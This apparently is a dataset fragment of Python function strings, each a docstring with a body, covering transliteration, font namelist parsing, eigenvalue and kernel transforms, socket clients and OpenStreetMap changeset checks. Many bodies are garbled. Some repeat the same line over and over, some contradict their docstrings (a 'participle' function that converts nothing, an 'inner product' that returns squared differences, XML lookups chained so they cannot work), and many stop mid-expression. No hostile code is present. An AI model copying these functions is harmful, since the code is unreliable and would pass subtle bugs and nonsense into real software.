        "def detect_transliteration(text):\n    \"\"\"Detect the input's transliteration scheme.\n\n    :param text: some text data, either a `unicode` or a `str` encoded\n                 in UTF-8.\n    \"\"\"\n    if isinstance(text, unicode):\n        text = text.encode('utf-8')\n    return detect_encoding(text)",
        "def add_default_schemes(self, schemes):\n        \"\"\"Add a variety of default schemes.\"\"\"\n        for scheme in schemes:\n            self.add_scheme(scheme)\n            self.default_schemes.append(scheme)",
        "def _int_to_utf8(s):\n    \"\"\"converts an array of integers to utf8 string\"\"\"\n    if isinstance(s, str):\n        return s\n    return ''.join(chr(i) for i in s)",
        "def set_delta(self, delta):\n        \"\"\"set the value of delta to reflect the current codepage\"\"\"\n        if delta < 0:\n            delta = 0\n        if delta > 0x10ffff:\n            delta = 0x10ffff\n        self.delta = delta",
        "def _unrecognised_char(self, char):\n        \"\"\"Handle unrecognised characters.\"\"\"\n        if char in self.unrecognised_chars:\n            self.unrecognised_chars.remove(char)\n            self.unrecognised_chars.append(char)\n            self.unrecognised_chars.append(char)\n            self.unrecognised_chars.append(char)\n            self.unrecognised_chars.append(char)\n            self.unrecognised_chars.append(char)\n            self.unrecognised_chars.append(char)\n            self.unrecognised_chars.append(char)\n            self.unrecognised_chars.append(char)\n            self.unrecognised_chars.append(char)\n            self.unrecognised_chars.",
        "def devanagari(self, c):\n        \"\"\"Transliterate a Latin character equivalent to Devanagari.\n        \n        Add VIRAMA for ligatures.\n        Convert standalone to dependent vowels.\n        \"\"\"\n        if c in self.VIRAMA:\n            return self.VIRAMA[c]\n        if c in self.DEMONA:\n            return self.DEMONA[c]\n        if c in self.DEMONAI:\n            return self.DEMONAI[c]\n        if c in self.DEMONAI:\n            return self.DEMONAI[c]\n        if c in self.DEMONAII:\n            return self.DEMONAII[c]\n        if c in self.DEMONAIII:\n            return self.DEMONAIII[c]\n        if c in self.DEMON",
        "def _get_file_contents(self, filename):\n        \"\"\"A convenience method\"\"\"\n        with open(filename, 'r') as f:\n            return f.read()",
        "def generate_top_level_rules(grammar, num, output=sys.stdout, max_recursion=10, seed=None):\n    \"\"\"\n    Load and generate ``num`` number of top-level rules from the specified grammar.\n\n    :param list grammar: The grammar file to load and generate data from\n    :param int num: The number of times to generate data\n    :param output: The output destination (an open, writable stream-type object. default=``sys.stdout``)\n    :param int max_recursion: The maximum reference-recursion when generating data (default=``10``)\n    :param int seed: The seed to initialize the PRNG with. If None, will not initialize it.\n    \"\"\"\n    if seed is None:\n        seed = random.randint(0, 2**31 - 1)\n    prng = PRNG(seed)\n    for _",
        "def build(self, pre=None, shortest=False):\n        \"\"\"\n        Build the ``Quote`` instance\n\n        :param list pre: The prerequisites list\n        :param bool shortest: Whether or not the shortest reference-chain (most minimal) version of the field should be generated.\n        \"\"\"\n        if self.is_reference_chain:\n            return self.build_reference_chain(pre, shortest)\n        else:\n            return self.build_prerequisites(pre, shortest)",
        "def _make_participle_list(verbs):\n    \"\"\"Make the list of verbs into present participles\n\n    E.g.:\n\n        empower -> empowering\n        drive -> driving\n    \"\"\"\n    verbs = [v for v in verbs if v.is_participle]\n    return verbs",
        "def delete_sent_mailer_messages(self):\n        \"\"\"Deletes sent MailerMessage records\"\"\"\n        for mailer_message in self.mailer_messages:\n            mailer_message.delete()",
        "def loadNamelistIncludes(filename):\n  \"\"\"Load the includes of an encoding Namelist files.\n\n  This is an implementation detail of readNamelist.\n  \"\"\"\n  with open(filename, 'r') as f:\n    for line in f:\n      line = line.strip()\n      if line.startswith('#') or line.startswith('#'):\n        continue\n      if line.startswith('encoding '):\n        yield line[8:]\n      elif line.startswith('encoding '):\n        yield line[8:]\n      elif line.startswith('include '):\n        yield line[8:]",
        "def readEncodingNamelist(filename):\n  \"\"\"Return a dict with the data of an encoding Namelist file.\n\n  This is an implementation detail of readNamelist.\n  \"\"\"\n  encoding = {}\n  with open(filename, 'r') as f:\n    for line in f:\n      line = line.strip()\n      if line.startswith('#'):\n        continue\n      if line.startswith('encoding '):\n        encoding[line[5:].strip()] = line[7:].strip()\n  return encoding",
        "def _check_infinite_recursion(namelist, namelist_path):\n  \"\"\"Detect infinite recursion and prevent it.\n\n  This is an implementation detail of readNamelist.\n\n  Raises NamelistRecursionError if namFilename is in the process of being included\n  \"\"\"\n  if namelist_path in _infinite_recursion_map:\n    raise NamelistRecursionError(\n        \"Namelist %s is in the process of being included\" % namelist_path)\n  _infinite_recursion_map[namelist_path] = True\n  for entry in namelist:\n    if entry.is_directory:\n      continue\n    if entry.name in _infinite_recursion_map:\n      raise NamelistRecursionError(\n          \"Namelist %s is in the process of being included\" % namelist_path)",
        "def CodepointsInSubset(namFilename, unique_glyphs=False):\n  \"\"\"Returns the set of codepoints contained in a given Namelist file.\n\n  This is a replacement CodepointsInSubset and implements the \"#$ include\"\n  header format.\n\n  Args:\n    namFilename: The path to the  Namelist file.\n    unique_glyphs: Optional, whether to only include glyphs unique to subset.\n  Returns:\n    A set containing the glyphs in the subset.\n  \"\"\"\n  with io.open(namFilename, \"r\", encoding=\"utf-8\") as f:\n    namelist = f.read()\n  codepoints = set()\n  for line in namelist.splitlines():\n    if line.startswith(\"#$ include\"):\n      if unique_glyphs:\n        codepoints.update(set(line.split(\"=\")[",
        "def orthographies(self):\n        \"\"\"Returns list of CharsetInfo about supported orthographies\"\"\"\n        orthographies = []\n        for orthography in self.orthographies_list:\n            orthography_info = self.orthography_info(orthography)\n            if orthography_info:\n                orthographies.append(orthography_info)\n        return orthographies",
        "def generate_header(self):\n        \"\"\"Generates header for oauth2\"\"\"\n        header = {\n            'Authorization': 'Bearer {}'.format(self.access_token),\n            'Content-Type': 'application/json',\n        }\n        return json.dumps(header)",
        "def parse_oauth2_access(self, access):\n        \"\"\"Parse oauth2 access\"\"\"\n        if access is None:\n            return None\n        if isinstance(access, str):\n            access = access.strip()\n        if not access:\n            return None\n        if access.startswith('oauth2:'):\n            return access[7:]\n        return access",
        "def refresh_token(self):\n        \"\"\"Refresh access token\"\"\"\n        self.access_token = self.get_access_token()\n        self.refresh_token = self.get_refresh_token()",
        "def _call_function(self, filename, extension, function):\n        \"\"\"Calls right function according to file extension\"\"\"\n        if extension == '.py':\n            return self._call_function_py(filename, function)\n        elif extension == '.pyw':\n            return self._call_function_pyw(filename, function)\n        elif extension == '.pyw':\n            return self._call_function_pyw(filename, function)\n        elif extension == '.py':\n            return self._call_function_py(filename, function)\n        elif extension == '.pyw':\n            return self._call_function_pyw(filename, function)\n        elif extension == '.py':\n            return self._call_function_py(filename, function)\n        elif extension == '.pyw':\n            return self._call_function_pyw(filename, function)\n        elif extension",
        "def save_data(self, data, filename):\n        \"\"\"Call right func to save data according to file extension\"\"\"\n        if self.save_func:\n            self.save_func(data, filename)",
        "def write_json(self, data, filename):\n        \"\"\"Write json data into a file\"\"\"\n        with open(filename, 'w') as f:\n            json.dump(data, f, indent=4, sort_keys=True)",
        "def get_data(self):\n        \"\"\"Get data from json file\"\"\"\n        if self.data is None:\n            self.data = self.get_json_file()\n        return self.data",
        "def get_data(self):\n        \"\"\"Get data from .yml file\"\"\"\n        if not os.path.exists(self.path):\n            return {}\n        with open(self.path, 'r') as yml_file:\n            yml_data = yaml.load(yml_file)\n        return yml_data",
        "def write_config(self, config):\n        \"\"\"Write data into a .yml file\"\"\"\n        with open(self.config_file, 'w') as f:\n            yaml.dump(config, f, default_flow_style=False)",
        "def _dist_to_rbf(self, X):\n        \"\"\"Turns distances into RBF values.\n\n        Parameters\n        ----------\n        X : array\n            The raw pairwise distances.\n\n        Returns\n        -------\n        X_rbf : array of same shape as X\n            The distances in X passed through the RBF kernel.\n        \"\"\"\n        X_rbf = np.zeros(X.shape)\n        for i in range(X.shape[0]):\n            X_rbf[i] = self.rbf_kernel(X[i, :])\n        return X_rbf",
        "def fit(self, X, y=None):\n        \"\"\"Learn the linear transformation to clipped eigenvalues.\n\n        Note that if min_eig isn't zero and any of the original eigenvalues\n        were exactly zero, this will leave those eigenvalues as zero.\n\n        Parameters\n        ----------\n        X : array, shape [n, n]\n            The *symmetric* input similarities. If X is asymmetric, it will be\n            treated as if it were symmetric based on its lower-triangular part.\n        \"\"\"\n        X = check_array(X)\n        if X.ndim != 2:\n            raise ValueError('X must be 2D')\n        if self.min_eig is None:\n            self.min_eig = 0\n        if self.max_eig is None:\n            self.max_eig = np.inf\n        if self.min_eig < 0:",
        "def fit(self, X):\n        \"\"\"Learn the linear transformation to flipped eigenvalues.\n\n        Parameters\n        ----------\n        X : array, shape [n, n]\n            The *symmetric* input similarities. If X is asymmetric, it will be\n            treated as if it were symmetric based on its lower-triangular part.\n        \"\"\"\n        X = check_array(X)\n        if X.ndim != 2:\n            raise ValueError('X must be 2D')\n        if X.shape[1] != self.n_eigenvalues:\n            raise ValueError('X must have same number of eigenvalues')\n        self.X = X\n        self.eigenvalues = np.linalg.eigvals(self.X)\n        self.eigenvalues = np.flipud(self.eigenvalues)\n        self.eigenvalues = np.flipud",
        "def transform(self, X):\n        \"\"\"\n        Transforms X according to the linear transformation corresponding to\n        flipping the input eigenvalues.\n\n        Parameters\n        ----------\n        X : array, shape [n_test, n]\n            The test similarities to training points.\n\n        Returns\n        -------\n        Xt : array, shape [n_test, n]\n            The transformed test similarites to training points.\n        \"\"\"\n        Xt = X.copy()\n        Xt[self.eigenvalues_ == 0] = 0\n        return Xt",
        "def flip_negative_eigenvalues(self, X):\n        \"\"\"Flips the negative eigenvalues of X.\n\n        Parameters\n        ----------\n        X : array, shape [n, n]\n            The *symmetric* input similarities. If X is asymmetric, it will be\n            treated as if it were symmetric based on its lower-triangular part.\n\n        Returns\n        -------\n        Xt : array, shape [n, n]\n            The transformed training similarities.\n        \"\"\"\n        Xt = X.copy()\n        if X.ndim == 2:\n            Xt = Xt.T\n        if X.ndim == 1:\n            Xt = Xt.T\n        Xt = Xt.T\n        Xt = Xt.T\n        Xt = Xt.T\n        Xt = Xt.T\n        Xt",
        "def fit(self, X):\n        \"\"\"\n        Learn the transformation to shifted eigenvalues. Only depends\n        on the input dimension.\n\n        Parameters\n        ----------\n        X : array, shape [n, n]\n            The *symmetric* input similarities.\n        \"\"\"\n        X = check_array(X)\n        self.eigenvalues_ = X.eigenvalues_\n        self.eigenvalues_ = X.eigenvalues_[:, np.newaxis]\n        self.eigenvalues_ = X.eigenvalues_[:, np.newaxis]\n        self.eigenvalues_ = X.eigenvalues_[:, np.newaxis]\n        self.eigenvalues_ = X.eigenvalues_[:, np.newaxis]\n        self.eigenvalues_ = X.eigenvalues_[:, np.newaxis]\n",
        "def transform(self, X):\n        \"\"\"\n        Transforms X according to the linear transformation corresponding to\n        shifting the input eigenvalues to all be at least ``self.min_eig``.\n\n        Parameters\n        ----------\n        X : array, shape [n_test, n]\n            The test similarities to training points.\n\n        Returns\n        -------\n        Xt : array, shape [n_test, n]\n            The transformed test similarites to training points. Only different\n            from X if X is the training data.\n        \"\"\"\n        Xt = X.copy()\n        Xt[:, self.eigen_indices] = Xt[:, self.eigen_indices].reshape(X.shape[:2])\n        Xt[:, self.eigen_indices] = Xt[:, self.eigen_indices].reshape(X.shape[:",
        "def pick(self, X):\n        \"\"\"\n        Picks the elements of the basis to use for the given data.\n\n        Only depends on the dimension of X. If it's more convenient, you can\n        pass a single integer for X, which is the dimension to use.\n\n        Parameters\n        ----------\n        X : an integer, a :class:`Features` instance, or a list of bag features\n            The input data, or just its dimension, since only the dimension is\n            needed here.\n        \"\"\"\n        if isinstance(X, (int, np.integer)):\n            X = self.get_dimension(X)\n        return self.basis.pick(X)",
        "def transform(self, X):\n        \"\"\"Transform a list of bag features into its projection series\n        representation.\n\n        Parameters\n        ----------\n        X : :class:`skl_groups.features.Features` or list of bag feature arrays\n            New data to transform. The data should all lie in [0, 1];\n            use :class:`skl_groups.preprocessing.BagMinMaxScaler` if not.\n\n        Returns\n        -------\n        X_new : integer array, shape ``[len(X), dim_]``\n            X transformed into the new space.\n        \"\"\"\n        X = self._check_X(X)\n        X_new = np.zeros(X.shape)\n        for i, X_bag in enumerate(X):\n            X_new[i] = self._transform_bag(X_bag)\n        return X_new",
        "def get_version(self):\n        \"\"\"Get distribution version.\n\n        This method is enhanced compared to original distutils implementation.\n        If the version string is set to a special value then instead of using\n        the actual value the real version is obtained by querying versiontools.\n\n        If versiontools package is not installed then the version is obtained\n        from the standard section of the ``PKG-INFO`` file. This file is\n        automatically created by any source distribution. This method is less\n        useful as it cannot take advantage of version control information that\n        is automatically loaded by versiontools. It has the advantage of not\n        requiring versiontools installation and that it does not depend on\n        ``setup_requires`` feature of ``setuptools``.\n        \"\"\"\n        if self.version is None:\n            self.version = self._get_version()\n        return self.version",
        "def get_version():\n    \"\"\"Get a live version string using versiontools\"\"\"\n    try:\n        from pkg_resources import parse_version\n        from pkg_resources import parse_version\n        return parse_version(__version__).version\n    except ImportError:\n        return 'unknown'",
        "def fit(self, X, **fit_params):\n        \"\"\"Fit the transformer on the stacked points.\n\n        Parameters\n        ----------\n        X : :class:`Features` or list of arrays of shape ``[n_samples[i], n_features]``\n            Training set. If a Features object, it will be stacked.\n\n        any other keyword argument :\n            Passed on as keyword arguments to the transformer's ``fit()``.\n        \"\"\"\n        if isinstance(X, Features):\n            X = X.stack()\n        self._fit(X, **fit_params)",
        "def transform(self, X, **kwargs):\n        \"\"\"Transform the stacked points.\n\n        Parameters\n        ----------\n        X : :class:`Features` or list of bag feature arrays\n            New data to transform.\n\n        any other keyword argument :\n            Passed on as keyword arguments to the transformer's ``transform()``.\n\n        Returns\n        -------\n        X_new : :class:`Features`\n            Transformed features.\n        \"\"\"\n        X = self._check_X(X)\n        X_new = self._transform(X, **kwargs)\n        return X_new",
        "def fit_transform(self, X, **kwargs):\n        \"\"\"Fit and transform the stacked points.\n\n        Parameters\n        ----------\n        X : :class:`Features` or list of bag feature arrays\n            Data to train on and transform.\n\n        any other keyword argument :\n            Passed on as keyword arguments to the transformer's ``transform()``.\n\n        Returns\n        -------\n        X_new : :class:`Features`\n            Transformed features.\n        \"\"\"\n        X = self._check_features(X)\n        X_new = self.transform(X, **kwargs)\n        return X_new",
        "def _compute_min_max(self, X):\n        \"\"\"Compute the minimum and maximum to be used for later scaling.\n\n        Parameters\n        ----------\n        X : array-like, shape [n_samples, n_features]\n            The data used to compute the per-feature minimum and maximum\n            used for later scaling along the features axis.\n        \"\"\"\n        if self.n_features == 1:\n            return X[0], X[-1]\n        else:\n            return np.min(X), np.max(X)",
        "def transform(self, X):\n        \"\"\"Scaling features of X according to feature_range.\n\n        Parameters\n        ----------\n        X : array-like with shape [n_samples, n_features]\n            Input data that will be transformed.\n        \"\"\"\n        X = check_array(X)\n        if X.ndim != 2:\n            raise ValueError('X must be 2D')\n        if self.feature_range is None:\n            return X\n        if X.shape[1] < self.feature_range[0]:\n            raise ValueError('X must have at least {} features'.format(\n                self.feature_range[0]))\n        if X.shape[1] > self.feature_range[1]:\n            raise ValueError('X must have at most {} features'.format(\n                self.feature_range[1]))\n        return X.reshape((X",
        "def undo_scaling(self, X, truncate=False):\n        \"\"\"Undo the scaling of X according to feature_range.\n\n        Note that if truncate is true, any truncated points will not\n        be restored exactly.\n\n        Parameters\n        ----------\n        X : array-like with shape [n_samples, n_features]\n            Input data that will be transformed.\n        \"\"\"\n        if truncate:\n            X = X[:, self.feature_range]\n        return X",
        "def fit(self, X):\n        \"\"\"Choose the codewords based on a training set.\n\n        Parameters\n        ----------\n        X : :class:`skl_groups.features.Features` or list of arrays of shape ``[n_samples[i], n_features]``\n            Training set. If a Features object, it will be stacked.\n        \"\"\"\n        if isinstance(X, Features):\n            X = X.stack()\n        self.codewords = self.codewords_from_features(X)",
        "def transform(self, X):\n        \"\"\"Transform a list of bag features into its bag-of-words representation.\n\n        Parameters\n        ----------\n        X : :class:`skl_groups.features.Features` or list of bag feature arrays\n            New data to transform.\n\n        Returns\n        -------\n        X_new : integer array, shape [len(X), kmeans.n_clusters]\n            X transformed into the new space.\n        \"\"\"\n        if isinstance(X, Features):\n            X = X.features\n        X_new = np.zeros(X.shape[0], dtype=int)\n        for i, X_bag in enumerate(X):\n            X_new[i] = self.transform_bag(X_bag)\n        return X_new",
        "def _is_integral(arr):\n    \"\"\"Checks whether the array is either integral or boolean.\"\"\"\n    if arr.dtype.kind == 'i':\n        return True\n    elif arr.dtype.kind == 'f':\n        return False\n    else:\n        raise ValueError('Cannot convert to boolean: %s' % arr.dtype)",
        "def _convert_to_int_array(arg):\n    \"\"\"\n    Returns argument as an integer array, converting floats if convertable.\n    Raises ValueError if it's a float array with nonintegral values.\n    \"\"\"\n    if isinstance(arg, np.ndarray):\n        if np.ndim(arg) == 1:\n            return arg\n        else:\n            raise ValueError(\"Cannot convert to integer array with non-integer dimensions\")\n    elif isinstance(arg, np.floating):\n        return np.asarray(arg)\n    else:\n        raise ValueError(\"Cannot convert to integer array with non-integral values\")",
        "def start(self, total=None):\n        \"\"\"Signal the start of the process.\n\n        Parameters\n        ----------\n        total : int\n            The total number of steps in the process, or None if unknown.\n        \"\"\"\n        if total is None:\n            total = self.total\n        self.total = total\n        self.start_time = time.time()",
        "def _build_flann_indices(self):\n        \"\"\"Builds FLANN indices for each bag.\"\"\"\n        for bag in self.bags:\n            for flann_index in range(self.flanns):\n                self.flanns[flann_index] = self.flanns[bag].index(flann_index)",
        "def get_within_bag_distances(self, bag_id):\n        \"\"\"Gets within-bag distances for each bag.\"\"\"\n        return self.get_within_bag_distances_for_bag(bag_id, self.bag_id_to_bag_id)",
        "def knn_inner_product(p, q, k):\n    r'''\n    Estimates the linear inner product \\int p q between two distributions,\n    based on kNN distances.\n    '''\n    return np.sum(np.square(p - q), axis=1)",
        "def knn_distance_p_2(knn_distances, knn_distances_shape):\n    r'''\n    Estimates \\int p^2 based on kNN distances.\n\n    In here because it's used in the l2 distance, above.\n\n    Returns array of shape (num_Ks,).\n    '''\n    num_Ks = knn_distances.shape[0]\n    p_2 = np.zeros((num_Ks,))\n    for i in range(num_Ks):\n        p_2[i] = knn_distances[i, :] ** 2\n    return p_2",
        "def topological_sort(dag):\n    \"\"\"Topologically sort a DAG, represented by a dict of child => set of parents.\n    The dependency dict is destroyed during operation.\n\n    Uses the Kahn algorithm: http://en.wikipedia.org/wiki/Topological_sorting\n    Not a particularly good implementation, but we're just running it on tiny\n    graphs.\n    \"\"\"\n    # The topological sort algorithm is a bit of a hack, but it's a bit of a hack\n    # but it's a bit of a hack.\n    #\n    # The topological sort algorithm is a bit of a hack, but it's a bit of a hack\n    # but it's a bit of a hack.\n    #\n    # The topological sort algorithm is a bit of a hack, but it's a bit of a hack\n    # but it's a bit of a",
        "def _check_array(self, ks):\n        \"\"\"Ks as an array and type-checked.\"\"\"\n        if not isinstance(ks, (list, tuple)):\n            raise TypeError(\"Ks must be a list or tuple\")\n        if len(ks) != len(self.kdims):\n            raise ValueError(\"Ks must be the same length as the number of \"\n                             \"dimensions\")\n        for k in ks:\n            if not isinstance(k, self.kdims):\n                raise TypeError(\"Ks must be a list or tuple\")",
        "def args(self):\n        \"\"\"The dictionary of arguments to give to FLANN.\"\"\"\n        if self._args is None:\n            self._args = self.args_dict()\n        return self._args",
        "def setup(self, X, get_rhos=False, do_sym=False, max_K=None):\n        \"\"\"\n        Sets up for divergence estimation \"from\" new data \"to\" X.\n        Builds FLANN indices for each bag, and maybe gets within-bag distances.\n\n        Parameters\n        ----------\n        X : list of arrays or :class:`skl_groups.features.Features`\n            The bags to search \"to\".\n\n        get_rhos : boolean, optional, default False\n            Compute within-bag distances :attr:`rhos_`. These are only needed\n            for some divergence functions or if do_sym is passed, and they'll\n            be computed (and saved) during :meth:`transform` if they're not\n            computed here.\n\n            If you're using Jensen-Shannon divergence, a higher max_",
        "def _convert_to_stacked(self, data):\n        \"\"\"If unstacked, convert to stacked. If stacked, do nothing.\"\"\"\n        if self.stacked:\n            return data\n        if self.unstacked:\n            return data.stack()\n        return data",
        "def copy(self, stack=False, copy_meta=False):\n        \"\"\"\n        Copies the Feature object. Makes a copy of the features array.\n\n        Parameters\n        ----------\n        stack : boolean, optional, default False\n            Whether to stack the copy if this one is unstacked.\n\n        copy_meta : boolean, optional, default False\n            Also copy the metadata. If False, metadata in both points to the\n            same object.\n        \"\"\"\n        if stack:\n            return Feature(self.features.copy(), copy_meta=copy_meta)\n        else:\n            return Feature(self.features.copy(), copy_meta=copy_meta)",
        "def _make_features(self, features):\n        \"\"\"Make a Features object with no metadata; points to the same features.\"\"\"\n        return Features(\n            self.name,\n            self.type,\n            self.description,\n            self.metadata,\n            features,\n        )",
        "def set_data(self, X):\n        \"\"\"Specify the data to which kernel values should be computed.\n\n        Parameters\n        ----------\n        X : list of arrays or :class:`skl_groups.features.Features`\n            The bags to compute \"to\".\n        \"\"\"\n        if isinstance(X, Features):\n            X = X.bags\n        self.X = X",
        "def transform(self, X):\n        \"\"\"Transform a list of bag features into a matrix of its mean features.\n\n        Parameters\n        ----------\n        X : :class:`skl_groups.features.Features` or list of bag feature arrays\n            Data to transform.\n\n        Returns\n        -------\n        X_new : array, shape ``[len(X), X.dim]``\n            X transformed into its means.\n        \"\"\"\n        X = self._check_X(X)\n        X_new = np.zeros((len(X), X.dim))\n        for i, X_bag in enumerate(X):\n            X_new[i, :] = X_bag.mean(axis=0)\n        return X_new",
        "def start(self):\n        \"\"\"Start listening to the server\"\"\"\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.socket.bind(('', self.port))\n        self.socket.listen(1)\n        self.server_thread = threading.Thread(target=self.server_loop)\n        self.server_thread.daemon = True\n        self.server_thread.start()",
        "def connect(self):\n        \"\"\"Connect to the server\n\n        :raise ConnectionError: If socket cannot establish a connection\n        \"\"\"\n        if self.sock is None:\n            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.sock.settimeout(self.timeout)\n            self.sock.connect((self.host, self.port))\n        else:\n            self.sock.close()",
        "def disconnect(self):\n        \"\"\"Disconnect from the server\"\"\"\n        if self.sock is not None:\n            self.sock.close()\n            self.sock = None",
        "def send_command(self, command):\n        \"\"\"Send a command to the server\n\n        :param string command: command to send\n        \"\"\"\n        if self.is_connected:\n            self.send_packet(command)\n        else:\n            raise Exception(\"Connection to server is not open\")",
        "def readline(self):\n        \"\"\"\n        Read a line from the server. Data is read from the socket until a character ``\\n`` is found\n\n        :return: the read line\n        :rtype: string\n        \"\"\"\n        line = self.socket.recv(self.read_size)\n        if line == b'\\n':\n            return line\n        else:\n            return line",
        "def read_block(self):\n        \"\"\"\n        Read a block from the server. Lines are read until a character ``.`` is found\n\n        :return: the read block\n        :rtype: string\n        \"\"\"\n        block = self.read_line()\n        while block:\n            yield block\n            block = self.read_line()",
        "def read_block(self):\n        \"\"\"\n        Read a block and return the result as XML\n\n        :return: block as xml\n        :rtype: xml.etree.ElementTree\n        \"\"\"\n        block = self.read_file()\n        return etree.fromstring(block)",
        "def analyse_openstreetmap(self, changeset):\n        \"\"\"Analyse an OpenStreetMap changeset.\"\"\"\n        if not changeset:\n            return\n        if not changeset.get('changeset'):\n            return\n        if not changeset.get('changeset_id'):\n            return\n        if not changeset.get('changeset_type'):\n            return\n        if changeset.get('changeset_type') != 'openstreetmap':\n            return\n        if changeset.get('changeset_id') != self.changeset_id:\n            return\n        if changeset.get('changeset_type') != 'openstreetmap':\n            return\n        if changeset.get('changeset_id') != self.changeset_id:\n            return\n        if changeset.get('changeset_type') != 'openstreetmap':\n            return\n        if changeset.get('changes",
        "def get_user_info(user):\n    \"\"\"\n    Get information about number of changesets, blocks and mapping days of a\n    user, using both the OSM API and the Mapbox comments APIself.\n    \"\"\"\n    # Get the OSM API\n    osm_api = get_osm_api(user)\n\n    # Get the Mapbox comments API\n    comments_api = get_comments_api(user)\n\n    # Get the number of changesets\n    changesets = osm_api.get_changesets()\n\n    # Get the number of blocks\n    blocks = osm_api.get_blocks()\n\n    # Get the number of mapping days\n    mapping_days = osm_api.get_mapping_days()\n\n    return {\n        'changesets': changesets,\n        'blocks': blocks,\n        'mapping_days",
        "def get_changeset_info(changeset):\n    \"\"\"Return a dictionary with id, user, user_id, bounds, date of creation\n    and all the tags of the changeset.\n\n    Args:\n        changeset: the XML string of the changeset.\n    \"\"\"\n    changeset_root = ET.fromstring(changeset)\n    changeset_root = changeset_root.find('changeset')\n    changeset_root = changeset_root.find('user')\n    changeset_root = changeset_root.find('user_id')\n    changeset_root = changeset_root.find('bounds')\n    changeset_root = changeset_root.find('date')\n    changeset_root = changeset_root.findall('tag')\n    return {\n        'id': changeset_root.get('id'),\n        'user': changeset_root.get('user'),\n        'user_id",
        "def get_changeset(changeset):\n    \"\"\"\n    Get the changeset using the OSM API and return the content as a XML\n    ElementTree.\n\n    Args:\n        changeset: the id of the changeset.\n    \"\"\"\n    changeset_url = osm_changeset_url(changeset)\n    response = requests.get(changeset_url)\n    response.raise_for_status()\n    return ET.fromstring(response.content)",
        "def get_changeset_metadata(changeset):\n    \"\"\"\n    Get the metadata of a changeset using the OSM API and return it as a XML\n    ElementTree.\n\n    Args:\n        changeset: the id of the changeset.\n    \"\"\"\n    changeset_id = changeset\n    changeset_url = osm_api_url + 'changesets/' + changeset_id\n    response = requests.get(changeset_url)\n    response.raise_for_status()\n    return ET.fromstring(response.text)",
        "def read_polygon(self, feature):\n        \"\"\"\n        Read the first feature from the geojson and return it as a Polygon\n        object.\n        \"\"\"\n        polygon = Polygon(feature)\n        polygon.geom_type = feature.get('type')\n        return polygon",
        "def filter_changesets(changesets, geojson):\n    \"\"\"Filter the changesets that intersects with the geojson geometry.\"\"\"\n    filtered_changesets = []\n    for changeset in changesets:\n        if changeset.geometry.intersects(geojson):\n            filtered_changesets.append(changeset)\n    return filtered_changesets",
        "def set_metadata(self):\n        \"\"\"Set the fields of this class with the metadata of the analysed\n        changeset.\"\"\"\n        self.id = self.get_metadata('id')\n        self.name = self.get_metadata('name')\n        self.description = self.get_metadata('description')\n        self.author = self.get_metadata('author')\n        self.author_email = self.get_metadata('author_email')\n        self.author_url = self.get_metadata('author_url')\n        self.author_url_full = self.get_metadata('author_url_full')\n        self.author_url_full_short = self.get_metadata('author_url_full_short')\n        self.author_url_short = self.get_metadata('author_url_short')\n        self.author_url_full",
        "def add_suspicious(self, reason):\n        \"\"\"Add suspicion reason and set the suspicious flag.\"\"\"\n        self.suspicious = True\n        self.reason = reason\n        self.save()",
        "def _count_and_verify_words(self, words, count, verify_words):\n        \"\"\"Execute the count and verify_words methods.\"\"\"\n        if not words:\n            return 0\n        if not verify_words:\n            return count\n        return sum(verify_words(word) for word in words)",
        "def _verify_fields(self, changeset):\n        \"\"\"\n        Verify the fields source, imagery_used and comment of the changeset\n        for some suspect words.\n        \"\"\"\n        for field in self.fields:\n            if field.name not in changeset:\n                raise ValueError(\"Field %s not in changeset\" % field.name)\n            if field.name == 'source':\n                if changeset[field.name] is None:\n                    raise ValueError(\"Field %s has no source\" % field.name)\n            if field.name == 'comment':\n                if changeset[field.name] is None:\n                    raise ValueError(\"Field %s has no comment\" % field.name)",
        "def is_powerfull_editor(self):\n        \"\"\"Verify if the software used in the changeset is a powerfull_editor.\"\"\"\n        if self.software_type == 'powerfull_editor':\n            return True\n        if self.software_type == 'powerfull_editor_v2':\n            return self.software_version == 2\n        return False",
        "def count_elements(self):\n        \"\"\"\n        Count the number of elements created, modified and deleted by the\n        changeset and analyses if it is a possible import, mass modification or\n        a mass deletion.\n        \"\"\"\n        if self.is_import:\n            return self.import_count\n        elif self.is_mass_modification:\n            return self.mass_modification_count\n        elif self.is_mass_deletion:\n            return self.mass_deletion_count",
        "def get_stream_uri(uri, timeout=None):\n    \"\"\"\n    Get a stream URI from a playlist URI, ``uri``.\n    Unwraps nested playlists until something that's not a playlist is found or\n    the ``timeout`` is reached.\n    \"\"\"\n    playlist = get_playlist(uri)\n    if playlist:\n        return playlist.get_stream_uri(timeout)\n    else:\n        return None",
        "def start(self, request_handler=None, error_handler=None,\n             debug=False, request_timeout=None, ssl=None, sock=None,\n             request_max_size=None, reuse_port=False, loop=None, protocol=None):\n        \"\"\"\n        Start asynchronous HTTP Server on an individual process.\n\n        :param request_handler: Sanic request handler with middleware\n        :param error_handler: Sanic error handler with middleware\n        :param debug: enables debug output (slows server)\n        :param request_timeout: time in seconds\n        :param ssl: SSLContext\n        :param sock: Socket for the server to accept connections from\n        :param request_max_size: size in bytes, `None` for no limit\n        :param reuse_port: `True` for multiple workers\n        :param loop: asyncio compatible event loop\n",
        "def grow(self, gods):\n        \"\"\"Grow this Pantheon by multiplying Gods.\"\"\"\n        self.gods = self.gods * gods\n        self.gods_per_unit = self.gods / self.unit_gods",
        "def get_on(self):\n        \"\"\"Get it on.\"\"\"\n        if self._on is None:\n            self._on = self.get_value('on')\n        return self._on",
        "def _compare_vectors(a, b):\n    \"\"\"Compare vectors. Borrowed from A. Parish.\"\"\"\n    if a.shape != b.shape:\n        raise ValueError(\"Vectors must have the same shape.\")\n    if a.dtype != b.dtype:\n        raise ValueError(\"Vectors must have the same dtype.\")\n    if a.ndim != b.ndim:\n        raise ValueError(\"Vectors must have the same number of dimensions.\")\n    if a.shape[0] != b.shape[0]:\n        raise ValueError(\"Vectors must have the same number of elements.\")\n    if a.shape[1] != b.shape[1]:\n        raise ValueError(\"Vectors must have the same number of elements.\")\n    if a.shape[2] != b.shape[2]:\n        raise ValueError(\"Vectors must have the same number of elements.\")\n    if a",
